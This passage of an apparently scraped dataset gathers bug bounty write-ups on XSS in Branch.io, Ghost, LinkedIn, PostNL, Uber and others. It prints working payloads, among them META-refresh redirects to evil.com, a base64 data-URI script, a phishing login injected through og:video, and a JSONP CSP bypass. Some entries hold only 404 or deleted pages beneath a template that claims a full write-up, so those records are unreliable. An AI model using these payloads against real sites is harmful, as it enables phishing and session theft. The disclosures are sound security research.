document.createElement('a'); parser.href = url; var protocol = parser.protocol.toLowerCase(); if ((‘javascript:', 'vbscript:', ‘data:').indexOf(protocol) < 0) { return url; } .... return null; if (['http:', 'https:'].indexOf(protocol) < 0) { window.top.location = validate(\"http://google.com\"); } So, how did this bug affect more than Tinder? go.tinder.com is an alias for custom.bnc.lt, a Branch.io resource. And many other companies have their alias pointing to it. To name a few websites affected by this vulnerability: RobinHood, Shopify, Canva, Yelp, Western Union, Letgo, Cuvva, imgur, Lookout, fair.com and more. Thanks to the fast response we got from Branch’s security team, this vulnerability has now been fixed for everyone’s domains. Other recent studies of ours: Critical RCE Vulnerability Found in Over a Million GPON Home Routers We review vendors based on rigorous testing and research but also take into account your feedback and our affiliate commission with providers. Some providers are owned by our parent company. Learn more vpnMentor was established in 2014 to review VPN services and cover privacy-related stories. Today, our team of hundreds of cybersecurity researchers, writers, and editors continues to help readers fight for their online freedom in partnership with Kape Technologies PLC, which also owns the following products: Holiday.com, ExpressVPN, CyberGhost, and Private Internet Access which may be ranked and reviewed on this website. The reviews published on vpnMentor are believed to be accurate as of the date of each article, and written according to our strict reviewing standards that prioritize professional and honest examination of the reviewer, taking into account the technical capabilities and qualities of the product together with its commercial value for users. The rankings and reviews we publish may also take into consideration the common ownership mentioned above, and affiliate commissions we earn for purchases through links on our website. We do not review all VPN providers and information is believed to be accurate as of the date of each article. Was this helpful? Share it! Share on Facebook 4 Tweet this 6 About the Author Kristina Perunicic Former Managing Editor Kristina Perunicic is a former editor for vpnMentor. She’s a cybersecurity expert with an interest in VPNs and their importance in the digital privacy landscape. Follow our experts: Did you like this article? Rate it! I hated it! I don't really like it It was ok Pretty good! Loved it! out of 10 - Voted by users Thank you for your feedback Please, comment on how to improve this article. Your feedback matters! Leave a comment This field must contain more than 50 characters The field content should not exceed 1000 letters Sorry, links are not allowed in this field! Name should contain at least 3 letters The field content should not exceed 80 letters Sorry, links are not allowed in this field! Special characters are not allowed in the Name field Please enter a valid email address Notify me of any updates on my contribution Submit Thanks for submitting a comment, %%name%%! We check all comments within 48 hours to ensure they're real and not offensive. Feel free to share this article in the meantime. Table of Contents Details: So, how did this bug affect more than Tinder? Our mission: We started vpnMentor to offer users a committed and helpful tool when navigating VPNs and web privacy. Categories / Top Picks Latest Blog Posts Latest News Best VPNs for Windows Best VPNs for Mac Best VPNs for iOS Best VPNs for Android Best VPNs for Netflix Best VPNs for Gaming Top Reviews ExpressVPN Review CyberGhost VPN Review Proton VPN Review Private Internet Access Review IPVanish VPN Review Info About Us Contact Our Team Privacy Policy Terms and Conditions of Use Human Sitemap Press Center - vpnMentor DMCA Policy Testing Methodology © 2025 vpnMentor | All Rights Reserved | Cookie Settings × Share it with your friends: DOM-XSS Bug Affecting Tinder, Shopify, Yelp, and More 4 6 Thanks for your feedback! Rate us on Trustpilot to help others find reliable VPN info. We appreciate your support! Rate us on Trustpilot No, thank you Rate us on Trustpilot No, thank you"}
{"source_url": "https://www.itsecguy.com/xss-with-put-in-ghost-blog/", "title": "XSS with PUT in Ghost Blog", "friendly_explanation": "This is a bug bounty writeup from https://www.itsecguy.com/xss-with-put-in-ghost-blog/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS with PUT in Ghost Blog StackCrash Home About 19 October 2018 / XSS XSS with PUT in Ghost Blog Intoduction For my blog I have tried several content management systems and a while ago I decided to use Ghost for its simplicity and ease of use. Recently, I found XSS in the Ghost platform from at least version 1.24.9 and still in the latest version on GitHub . Most likely the XSS exists in much earlier versions as well. Note: this XSS does require administrator or owner roles and due to CORS/Same-Origin restrictions the likelyhood of exploitation outside of lab conditions is low. XSS in the API While auditing Ghost I discovered that there is an API call that is vulnerable to XSS. The particular API call is /ghost/api/v0.1/settings/ . The API call can be triggered from several of the settings tabs when an administrator or owner saves the settings. The API call sends a PUT request with JSON parameters. There are four parameters in the JSON that are vulnerable to XSS: logo, cover_image, ghost_head and ghost_foot. All four of the parameters will cause a XSS payload to be executed on every page of the website served by Ghost. The payload itself is very simple and only involves closing a script block before providing a new script block containing the XSS payload. The full settings JSON does not need to be sent with the request in order to exploit the XSS. Only sending the desired parameter and payload is sufficient. Note: the ghost_head and ghost_foot parameters are the same ones where in the administrator interface a user can place custom scripts. So they are meant to contain scripts so the XSS ends up being intended functionality for those two parameters. Rediscovery After finding the XSS I decided to do some more digging in Ghost past and found out I rediscovered an old XSS. VoidSec had previously discovered XSS in the same API call. It should be noted Ghost claimed in version 0.5.9 to have remediated this vulnerability and the original payload from VoidSec's report didn't work in the version I tested. Limitations Due to the API call being an authenticated PUT request and limitations of CORS exploiting the vulnerability an attacker would have to have to be able to access the session token for an administrator or owner. It is possible to bypass the CORS restrictions by sending the request through a proxy such as CORS Anywhere But modern browsers won't send the session token with the request since it doesn't comply with the same origin policy. Bypassing the same origin policy is the harder part. There are ways to by pass the same origin policy but thats for another blog post. Disclosure I initially disclosed to [email protected] and until I sent a third email about the impending public disclosure I never received a response. After the thrid email they responded referencing their now updated SECURITY.md . I did verify the XSS still exist as of version 2.2.0. Timeline 21 July 2018 - Initial reported to Ghost via email 30 July 2018 - Follow-up email sent to Ghost 4 October 2018 - Notified Ghost of upcoming public disclosure 5 October 2018 - Response from Ghost referencing updated SECURITY.md 19 October 2018 - Public disclosure after 90 days since initial report StackCrash Read more posts by this author. Read More SANSHolidayChallenge The 2018 SANS Holiday Hack Challenge - Write-Up IntroductionThis year's SANS Holiday Hack Challenge came in the form of a security conference called KringleCon where I took on the role of an attendee. The challenge had several parts to it. Throughout StackCrash 27 min read Python Custom Web Server Responses with Python Introduction In my job sometimes I have to setup quick web servers to respond to request in certain ways. Python does a great job at making this easy without having to have any StackCrash 4 min read StackCrash — XSS with PUT in Ghost Blog Share this StackCrash © 2025 Latest Posts Twitter"}
{"source_url": "https://www.secu.ninja/2018/12/04/how-to-accidentally-find-a-xss-in-protonmail-ios-app/", "title": "404 Not Found", "friendly_explanation": "This is a bug bounty writeup from https://www.secu.ninja/2018/12/04/how-to-accidentally-find-a-xss-in-protonmail-ios-app/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n404 Not Found Not Found The requested URL was not found on this server."}
{"source_url": "https://medium.com/@brs.sgdc/google-stored-xss-in-payments-350cd7ba0d1b", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@brs.sgdc/google-stored-xss-in-payments-350cd7ba0d1b. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/@jonathanbouman/persistent-xss-unvalidated-open-graph-embed-at-linkedin-com-db6188acedd9", "title": "Persistent XSS (unvalidated Open Graph embed) at LinkedIn.com | by Jonathan Bouman | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@jonathanbouman/persistent-xss-unvalidated-open-graph-embed-at-linkedin-com-db6188acedd9. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPersistent XSS (unvalidated Open Graph embed) at LinkedIn.com | by Jonathan Bouman | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Persistent XSS (unvalidated Open Graph embed) at LinkedIn.com Jonathan Bouman 8 min read · Oct 7, 2018 -- Listen Share Press enter or click to view image in full size Proof of concept Are you aware of any (private) bug bounty programs? I would love to get an invite. Please get in touch with me: Jonathan@Protozoan.nl Background In my previous report we learned more about a special type of the persistent XSS attack; the unvalidated oEmbed attack . This attack allows us to inject our HTML and javascript code by manipulating the oEmbed functionality. oEmbed is an open format designed to allow embedding content from a website into another website. Almost all of the media rich platforms support the oEmbed standard. For example you can easily add a Vimeo video to your Wordpress blog by just pasting the link into the article. Wordpress will convert this link into HTML. This HTML loads the video player of Vimeo and starts the specific video. Medium for example will create a nice box with my twitter profile picture if I paste a link to my twitter profile into this post. This is oEmbed in action. As we learned previously, they were vulnerable and allowed unvalidated oEmbeds. Jonathan Bouman (@JonathanBouman) | Twitter The latest Tweets from Jonathan Bouman (@JonathanBouman). Medical Doctor (GP in training), Web Developer, Security… www.twitter.com Press enter or click to view image in full size oEmbed endpoint is specified by Twitter, Medium will use it for the embed Another way to embed visual rich content is by using the Open Graph Protocol . A website can add Open Graph Tags to their page in order to specify what type of content should be used for embeds. Press enter or click to view image in full size Wikipedia has an og:image meta tag, it defines the image that should be displayed if one embeds the article Most platforms check the urls for these specific oEmbed and Open Graph Tags before they embed the content. They do this in a specific order . After checking all the tags they will decide if and how the link got embedded. The big advantage of embeds is that readers don’t have to leave a blog to view the media rich content (e.g. video, images, presentations). Also for media platforms, like Vimeo and Youtube, it’s a great way to increase their exposure and views. Most of the platforms that allow you to embed external content have a whitelist of allowed domains; see Wordpress for example . You simply don’t want unvalidated HTML being injected into your platform. But what happens if this whitelist fails and we are able to inject our evil code into our target platform? We already proved oEmbed to be vulnerable , now let’s see if we can pull this trick again by manipulating Open Graph tags , let’s give it a try! Pick our target Who should we pick today? You say LinkedIn? Good choice! LinkedIn is one of my favorite places to go whenever I try to stay in touch with fellow researchers. Furthermore it’s a place where plenty of CEO/CTO/CTTO/CNYANCATO’s hang around. So whenever I got stuck in reporting bugs (e.g. non responsonding support desks), I try to get in touch with the people responsible. Sending a quick LinkedIn direct message is often enough; ‘Hey, can you take a look at ticket 4242, your site is vulnerable. Support is sleeping.’ Last but not least; LinkedIn got a nice responsible disclosure and they even have a (private) bug bounty program . So let’s try to get an invite for this bug bounty program by filing our first report with them! Identifying targets Blogs, that’s what we think of if we look for places that allow us to embed external content; say hello to LinkedIn Articles . You can open this part of LinkedIn by visiting your news feed and press the Write an Article button. Press enter or click to view image in full size Write an article We get a nice and clean editor that allows us to write our first article, consisting of a headline and some content. Next to our cursor there is a little icon that allows us to ‘ Add images or video for visual impact.’ Press enter or click to view image in full size The blog editor If we press this little icon, we can pick the Links button and add visual rich content to our blog. Press enter or click to view image in full size The embed wizard, magic! Embed Requests Time to fire up Burp Suite and inspect our network traffic, what happens after we fill in the URL? Press enter or click to view image in full size Link got converted to HTML code that embeds the Youtube player As we can see LinkedIn converts our url into HTML code that we are allowed to embed. The response is URL encoded, the URL decoded version is: {“embedIframe”:”<iframe src=\\” https://www.linkedin.com/pulse/api/edit/embed?embed={ \"request\":{\"originalUrl\":\" https://www.youtube.com/watch?v=9hWgA7qjK2c \",\"finalUrl\":\" https://www.youtube.com/watch?v=9hWgA7qjK2c \"},\"images\":[{\"width\":480,\"url\":\" https://i.ytimg.com/vi/9hWgA7qjK2c/hqdefault.jpg \",\"height\":360},{\"width\":1920,\"url\":\" https://i.ytimg.com/vi/9hWgA7qjK2c/maxresdefault.jpg \",\"height\":1080}],\"data\":{\"com.linkedin.treasury.Video\":{\"width\":480,\"html\":\"<iframe scrolling=\\”no\\” allowfullscreen src=\\”//media.licdn.com/embeds/media.html?src= https://www.youtube.com/embed/9hWgA7qjK2c?feature=oembed&amp;url=https://www.youtube.com/watch?v=9hWgA7qjK2c&amp;type=text/html&amp;schema=youtube\\ \" width=\\”480\\” frameborder=\\”0\\” class=\\”embedly-embed\\” height=\\”270\\” />”,”height”:270}},”provider”:{“display”:”YouTube”,”name”:”YouTube”,”url”:” https://www.youtube.com/ \"},\"author\":{\"name\":\"321 Relaxing — Meditation Relax Clips”},”description”:{“localized”:{“en_US”:”Rain HD video and forest, relaxing rain sounds and forest sounds for sleeping meditation. Nature sounds relaxation. Rainforest sounds: https://www.youtube.co ...\"}},\"title\":{\"localized\":{\"en_US\":\"Rain Sounds and Forest Sounds — Relaxing Sleep”}},”type”:”video”}&signature=AcdfNDjBXZOjo2vdz4EOixtGBrlx\\”></iframe>”,”universal”:true} The editor parses this iframe into our article and this results in three iframes being nested in each other before the video player shows up. There we go; we just embedded a Youtube video with relaxing rain sounds . Press enter or click to view image in full size Nested iframes, it takes three iframes before we can listen to jungle sounds. This means that even if we are able to inject our own evil HTML we won’t have access to the LinkedIn domain; we are isolated in an iframe . We can’t access any LinkedIn cookies and we are not able to manipulate the HTML outside of the iframe. However the impact can still be big if we can inject a fake LinkedIn login screen and steal passwords of visitors . LinkedIn embeds the content without any visual hints that something is an embed, just clean borderless boxes. So it’s not possible for visitors to distinguish it from a real login screen. A perfect phishing login First we need to design the phishing login screen. Since we want to show the impact in a way that also non-tech people understand the severity. A simple javascript alert box is often not sufficient. A good tool to duplicate HTML elements of other websites is SnappySnippet. This Chrome extension lets you select an element in a website and copy paste it as plain HTML and CSS. Press enter or click to view image in full size SnappySnippet We paste the code from SnappySnippet into a new HTML file, tune it a little bit, and add some javascript at the end so it captures the email and password. If one submits the form we want to display the login details in a javascript alert box as a proof of concept. Press enter or click to view image in full size Javascript alert of the login details Let’s upload this fake login html file to our own server and try to embed it in our LinkedIn article. Just to see what happens if we link to it without any oEmbed or Open Graph tags. Fake login embed without any tags, it does not work As we can see it falls back to an ‘universal-embed-wrapper’ that just displays our URL with a little gray border around it. Exploiting the Open Graph If we take a close look at the Open Graph Protocol specs we discover that there is a tag named og:video. It defines how a video player should be embedded. Press enter or click to view image in full size Vimeo example of Open Graph video meta tags What if we create a HTML file with the og:video tags that loads our fake login instead of the video player? Press enter or click to view image in full size The document we are trying to embed, it loads the fake login as a video player Press enter or click to view image in full size Our fake login loads, LinkedIn thinks it’s a genuine video player Tada! We’ve got our fake login embedded inside a LinkedIn article. Let’s name the article ‘Oops, something went wrong!’ and we’re ready to go. We are now able to spear phish other users by sharing them a private link to the draft of this article. Or we can just publish it on the LinkedIn network and see what happens. We’ve got everything ready now, time to file a report with LinkedIn security. Press enter or click to view image in full size Proof of concept Conclusion We found a way to create a perfect phishing website on the LinkedIn.com domain. We used the Open Graph Video meta tag in order to inject our phishing login as a video player in an LinkedIn article. This is a variation of the persistent XSS attack. Impact of this attack - Perfect situation for (spear) phishing - We may auto redirect users to another page after they have entered their credentials, so it doesn’t look suspicious (by using top.location.href ) - Attack visitors by embedding http://beefproject.com/ - Allows an attacker to perform clickjack attacks Do I forget anything? Leave a comment! Solutions that prevent this attack - Never trust Open Graph Tags from strangers, use a whitelist for embeds - Don’t allow iframes to break out Rewards None. Timeline 01–07–2018 Discovered and reported bug by email 01–07–2018 LinkedIn informed me they received the report 20–07–2018 Requested update 24–07–2018 LinkedIn replied that fix is deployed, I replied all my test accounts are blocked by LinkedIn, unable to confirm fix, requested to unblock the test accounts, no reply 02–08–2018 Used my personal account for testing, confirmed the fix, requested LinkedIn if bug is eligible for any rewards or invite into private program, requested to unblock my test account. 04–08–2018 Reply from LinkedIn that I’m on their review list for an invite to the private program. No answer on question if bug is eligible for reward. All accounts still blocked, so not able to test for any new bugs (no new accounts due to phone number verification). LinkedIn requested a review of this post prior publication. 08–08–2018 Sent LinkedIn draft of this blog for review, no reply 15–08–2018 Requested update from LinkedIn 21–08–2018 LinkedIn replied, approved the blog, informed me they don’t offer rewards outside of their private bug bounty program, I am added to their list of ‘researchers for consideration’. 07–10–2018 Published this blog (delayed the publication because I had to wait for Medium.com to fix the same sort of bug ). Published this blog on Hackerone their new open blogging platform. LinkedIn Hacking Ethical Hacking Security Bug Bounty -- -- Written by Jonathan Bouman 2.6K followers · 38 following Medical doctor / Web developer / Security researcher - https://Protozoan.nl No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://blog.bentkowski.info/2018/09/another-xss-in-google-colaboratory.html", "title": "MB blog: Another XSS in Google Colaboratory", "friendly_explanation": "This is a bug bounty writeup from https://blog.bentkowski.info/2018/09/another-xss-in-google-colaboratory.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMB blog: Another XSS in Google Colaboratory"}
{"source_url": "https://medium.com/bugbountywriteup/xss-bypass-using-meta-tag-in-realestate-postnl-nl-32db25db7308", "title": "XSS bypass using META tag in realestate.postnl.nl | by Prial Islam Khan | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/xss-bypass-using-meta-tag-in-realestate-postnl-nl-32db25db7308. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS bypass using META tag in realestate.postnl.nl | by Prial Islam Khan | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication XSS bypass using META tag in realestate.postnl.nl Prial Islam Khan 3 min read · Nov 18, 2018 -- 7 Listen Share Hi readers , Today I will write about a XSS Vulnerability I reported to postnl.nl bug bounty Program . Vulnerable Endpoint :- http://realestate.postnl.nl/?Lang= To test a normal Reflected XSS I Input “><xsstest> in the Lang parameter and in source it was reflected properly inside META tag like below :- <meta name=\"language\" content=\"\"><xsstest>\" /> Looks simple right ? Then wait a little :’) . Then I Inputted “><img src=x> and I got :- Press enter or click to view image in full size Surprise you nigga 🥳🥳🥳 I tried with many HTML tags and I got 2 points here :- Any Valid HTML tag is not allowed . I can created any attributes here . So I googled for meta tag attributes and got :- Press enter or click to view image in full size looks interesting 🤔🤔🤔 The http-equiv attribute took my attention . Now I again google more about it and learned that :- META tag has the http-equiv directive. This directive allows you to define the equivalent of an HTTP header in the HTML code . The http-equiv directive can take a value of refresh , which can be used to redirect a user to another page. Then I input 0;http://evil.com\"HTTP-EQUIV=\"refresh\" and response was :- <meta name=\"language\" content=\"0;http://evil.com\"HTTP-EQUIV=\"refresh\"\" /> And I got redirected to evil.com . So I have open redirection now . Now we can try for Data URI XSS . So I input :- 0;javascript:alert(1)\"HTTP-EQUIV=\"refresh\" and response was :- Press enter or click to view image in full size This was again Triaged for the keyword javascript used in payload . So I used Base64 encoded payload :- 0;data:text/html;base64,PHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgQnkgUHJpYWwiKTwvc2NyaXB0Pg==\"HTTP-EQUIV=\"refresh\" and response source was :- <meta name=\"language\" content=\"0;data:text/html;base64,PHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgQnkgUHJpYWwiKTwvc2NyaXB0Pg==\"HTTP-EQUIV=\"refresh\"\" /> And now when I visit http://realestate.postnl.nl/?Lang=0%3Bdata%3Atext%2fhtml%3Bbase64%2CPHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgQnkgUHJpYWwiKTwvc2NyaXB0Pg%3D%3D%22HTTP-EQUIV%3D%22refresh%22 I got XSS popup . Press enter or click to view image in full size I reported it to their Zerocopter report form . Then they deployed a Fix by blacklisting the data:text/html;base64 keyword like they have blacklisted JavaScript keyword but still I can do Open Redirect when a user visits :- http://realestate.postnl.nl/?Lang=0%3Bhttp%3A%2f%2fevil.com%22HTTP-EQUIV%3D%22refresh%22 Press enter or click to view image in full size Looks cool 🙄🙄🙄 They again Fixed the issue and listed My name on their Hall Of Fame page & also offered to send some goodies 😍😍😍 . Press enter or click to view image in full size 😍😍😍 Thanks for reading . Follow me on twitter If you have any query ask me on Facebook JavaScript Xss Attack Infosec Bug Bounty Xss Bypass -- -- 7 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Prial Islam Khan 1.1K followers · 258 following A teenager boy with passion of Breaking Security . Responses ( 7 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://nirmaldahal.com.np/r-xss-csrf-bypass-to-account-takeover/", "title": "404: This page could not be found.", "friendly_explanation": "This is a bug bounty writeup from https://nirmaldahal.com.np/r-xss-csrf-bypass-to-account-takeover/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n404: This page could not be found. Nirmal Dahal 404 This page could not be found. LinkedIn X"}
{"source_url": "https://medium.com/@alicanact60/my-first-0day-exploit-csp-bypass-reflected-xss-bugbounty-c7efa4bed3d7", "title": "My First 0day Exploit (CSP Bypass + Reflected XSS) #BUGBOUNTY | by Ali TÜTÜNCÜ | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@alicanact60/my-first-0day-exploit-csp-bypass-reflected-xss-bugbounty-c7efa4bed3d7. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMy First 0day Exploit (CSP Bypass + Reflected XSS) #BUGBOUNTY | by Ali TÜTÜNCÜ | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Ali TÜTÜNCÜ 2 min read · Oct 7, 2018 -- 2 Listen Share My First 0day Exploit (Reflected XSS) #BUGBOUNTY Hi guys! Steps: When I went to https://example.com/amp-iframe-redirect?scheme_redirect=&redirect_strategy=0 , saw this code block: Press enter or click to view image in full size 2. Then I thought about which characters I could use. So, I went to: https://example.com/amp-iframe-redirect?scheme_redirect=&redirect_strategy=”’<>/(); Press enter or click to view image in full size Then I saw I could not use </script><img src=v onerror=alert(1)> for get xss. I thought I will not bypass it, but maybe I can add javascript. So, I can get xss. After researching javascript for a while, I created the required block of code: ); alert(document.domain); if (1 When I go to https://example.com/amp-iframe-redirect?scheme_redirect=&redirect_strategy=); alert(document.domain); if (1 , I saw the xss alert ;) Press enter or click to view image in full size Some popular companies are using this script. Example; Shopify Canva Yelp Western Union Cuvva etc And reported developer’s bug bounty program. Then, this’s fixed. If you want to get more notifications about my works, that’s my Twitter account. https://twitter.com/alicanact60 Security Bugbounty -- -- 2 Written by Ali TÜTÜNCÜ 347 followers · 0 following Twitter: https://twitter.com/alicanact60 Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/dom-based-xss-or-why-you-should-not-rely-on-cloudflare-too-much-a1aa9f0ead7d", "title": "[DOM based XSS] Or why you should not rely on Cloudflare too much | by KatsuragiCSL | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/dom-based-xss-or-why-you-should-not-rely-on-cloudflare-too-much-a1aa9f0ead7d. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n[DOM based XSS] Or why you should not rely on Cloudflare too much | by KatsuragiCSL | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication [DOM based XSS] Or why you should not rely on Cloudflare too much KatsuragiCSL 3 min read · Nov 14, 2018 -- 1 Listen Share Foreword So I found another XSS in a bug bounty program again. The website [redacted.com] is protected by Cloudflare WAF and hence many payloads are filtered. But the website is implemented in an extremely bad way that even Cloudflare can’t protect it. Just a few days before the day I found this bug, I was telling my colleagues “don’t rely on firewalls / security products too much” during an internal presentation. Now I have a real example to talk about. LOL. Summary When I triggered an error on the login page, a parameter called Message is reflected in the body of the html AND a pop-up box (i.e. the value of “Message” is inserted in javascript, right inside alert(“[value_here]”)) without filtering. So I was able to insert anything I like in the script. Payload: This is an outdated page. You will now be redirected to our new page\"); window.location=\"https://google.com\"// Press enter or click to view image in full size So we can spoof the users that they are going to an updated webpage and login again. (Redirecting to google for demonstration here) How did I find it In fact I was checking their register and sign in function and attempting to find some application flaws. I registered an account using email a@a.com without verifying it and tried to signup with the same email again. Then an error message is popped up: Press enter or click to view image in full size And I found that the URL became https://redacted.com/Secure/Login.aspx?UserID=a@a.com&ReturnUrl=&Message=The E-Mail Address entered (a@a.com) is already on file. If this is your correct e-mail address, you may sign in as an existing customer. Exactly the same of that in the pop-up box and the text shown on the top: Press enter or click to view image in full size So the message maybe reflected in the body of the HTML. I tried the straight forward <script>alert(1)</script> payload. Then I got this: Press enter or click to view image in full size Oops. Cloudflare. But that was in my expectation 🙂 . The payload is for dummies. I noticed that the message is inserted in javascript directly: Press enter or click to view image in full size So what we can do is closing the double quote and the parentheses like alert(\" something_here\");evil_script_here// \") Then we can do anything we want. Good firewalls can’t save bad code. That’s it. Thanks for reading. Security Bug Bounty Writeup -- -- 1 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by KatsuragiCSL 163 followers · 22 following A security enthusiast. @ZuuitterE Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@efkan162/how-i-xssed-uber-and-bypassed-csp-9ae52404f4c5", "title": "How I XSS’ed Uber and Bypassed CSP | by Efkan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@efkan162/how-i-xssed-uber-and-bypassed-csp-9ae52404f4c5. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I XSS’ed Uber and Bypassed CSP | by Efkan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I XSS’ed Uber and Bypassed CSP Efkan 5 min read · Sep 21, 2018 -- 7 Listen Share Hi hunters, Before we start,I’d like to talk about myself a bit. First of all,I’m not a security researcher/security engineer or anything similar,I’m just a guy who learns new things and who tries to improve himself every day.Due to some school related reasons I couldn’t write any of my findings,but since I’m in some kind of resting period and since I believe “Sharing is caring” it’s time to write about them ,I will publish a write-up every week ! My journey started 2 years ago with Uber.But,while I’m not a new person in this bug bounties,I’m definitely a newbie,so maybe my blogs might not be very interesting for experts.Anyway,let’s come to the point. The Story I was looking for some open redirect vulnerabilities on subdomains of Uber,I know they don’t see “Open Redirect” as a vulnerability but I thought “Why not chain it with other vulnerabilities ? Maybe it could lead to account takeover or something ? “ My thoughts triggered my ambition.When I was looking for endpoints on partners.uber.com this URL got my interest https://partners.uber.com/carrier-discounts/att/redirect?href=http://www.wireless.att.com/ I saw this URL in a forum then I found a similar one with a help of Google dorks.Was it vulnerable for open redirect ? Yes ! Then,there was one job to do,find another vulnerability in login section to combine it.I looked for it,really,hours and hours but I wasn’t lucky at all.So there is no need to report it, they say : “Open redirects. 99% of open redirects have low security impact. For the rare cases where the impact is higher, e.g., stealing oauth tokens, we do still want to hear about them.” After one week I checked this URL and it wasn’t working,as now,whatever you put to http parameter,it will redirect you to https://www.wireless.att.com So they fixed it,Did they realize it by themselves or somebody reported it ? I don’t know and I don’t care.But,you know the feeling you are starting with a goal of something big,in the end all you have is a tired, frustrated person.After this,I was upset but triggered second time to find something,and now the time is coming to trigger XSS,not myself ! The Vulnerability If I would ask “ What are the most known URL’s,links of Uber” to you,probably your answer will be invitation links.You can see these links everywhere,In a forum post,in Twitter,in Facebook,in Instagram… There are different URL’s for invitation links : https://www.uber.com/a/join?exp_hvp=1&invite_code=bq6ew1w9ue I checked this one for XSS but nothing came up :( https://partners.uber.com/p3/referrals/ms?i=bq6ew1w9ue What about this one ? It’s the same invite code and if you click you can see that it redirects to other URL,but why not check for other parameters ? With a help of basic dorks I looked for everything under this subdomain. site:partners.uber.com And with this dork you can reach out to a very big list of invite links.My point was to find another parameter and I found one ! https://partners.uber.com/p3/referrals/ms?i=bq6ew1w9ue&m=ANNIVERSARY&v=1 Looks cool,but where is the XSS ? The “v” parameter shows how many years he/she worked as Uber driver,it’s like a celebration of anniversary.As soon as I found this parameter,tried to inject some XSS payload but there was no XSS pop-up,suddenly I checked the source code. Original Code : content=”static/images/milestones/anniversary/anniversary_1.png” /> After my payload content=”static/images/milestones/anniversary/anniversary_1 “><img src=x onerror=alert(document.cookie)>.png” /> As you can see,there was no filtering but in the meantime there was no XSS pop-up,it reminded me Content Security Policy.What is CSP ? As Netsparker’s blog says : “ The Content Security Policy (CSP) standard is a way to selectively specify which content should be loaded in web applications. This can be done by whitelisting specific origins, using nonces or hashes”. So if there will be any whitelisted domains we can try to use them against CSP.Let’s check Uber’s CSP header for partners.uber.com.It’s very long,I will add only the part after “script-src” script-src ‘self’ ‘unsafe-inline’ ‘nonce-9f4b94bf-a195–4d8c-b474–879ae6d1d471’ ‘self’ ‘unsafe-inline’ https://pullo.uberinternal.com https://apis.google.com https://www.google.com https://d1a3f4spazzrp4.cloudfront.net https://*.uber.com https://rules.quantcount.com https://www.google-analytics.com https://ssl.google-analytics.com https://d3i4yxtzktqr9n.cloudfront.net https://d1a3f4spazzrp4.cloudfront.net; Firstly,I checked for rules.quantcount.com and looked for json endpoints but there’s nothing much about it.And there’s a huge advantage for us because they whitelisted *uber.com so if we can find any JSON endpoint with callback or anything similar,then we are able to execute XSS.In the meantime,I was reading a blog named “DOM XSS — auth.uber.com”,the guy “ stamone ” did very good job,and you should read that ! http://stamone-bug-bounty.blogspot.com/2017/10/dom-xss-auth14.html Check out his write-up,he also bypassed CSP ,how ? In his report CSP was allowing him to get something from *.marketo.com So he used basic dorks and found out a callback parameter and works great as you can see Press enter or click to view image in full size After reading this write-up, I went to Virustotal and checked Uber’s subdomains,one of them got me ! What,mkto ? Is “mkto” the short name for marketo ?! Press enter or click to view image in full size YESS! It was. Go to mkto.uber.com,it will redirect you to “ https://app-ab19.marketo.com/index.php ”. It is definitely marketo.So now it’s time to use it against CSP.Using a basic payload I created this link and checked,it worked out. https://partners.uber.com/p3/referrals/ms?i=bq6ew1w9ue&m=ANNIVERSARY&v=1 \"><script src=” https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain); \"></script> Press enter or click to view image in full size This time I triggered XSS ! Timeline [03–08–2018] Reported to Uber [07–08–2018] Changed the status to 